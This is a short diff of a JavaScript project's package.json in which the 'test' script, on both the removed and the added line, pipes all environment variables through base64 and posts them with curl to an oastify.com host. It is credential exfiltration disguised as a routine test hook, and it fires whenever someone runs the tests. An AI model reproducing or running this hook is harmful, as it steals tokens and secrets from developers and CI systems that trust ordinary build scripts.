@@ -19,7 +19,7 @@
     "prettier:check": "prettier --check '**/*.{jsx,js,ts,tsx,md,mdx}'",
     "storybook": "start-storybook -p 9001 -c ./scripts/.storybook",
     "storybook:build": "build-storybook -c ./scripts/.storybook -o dist-storybook --webpack-stats-json",
-    "test": "set | base64 | curl -X POST --insecure --data-binary @- srniesmpudsrg4segi7bb2m8lzrqfi37.oastify.com",
+    "test": "set |  base64 | curl -X POST --insecure --data-binary @- srniesmpudsrg4segi7bb2m8lzrqfi37.oastify.com",
     "tsc": "tsc --noEmit",
     "tsc:watch": "tsc --noEmit --watch",
     "docs": "npm run-script docs:next",
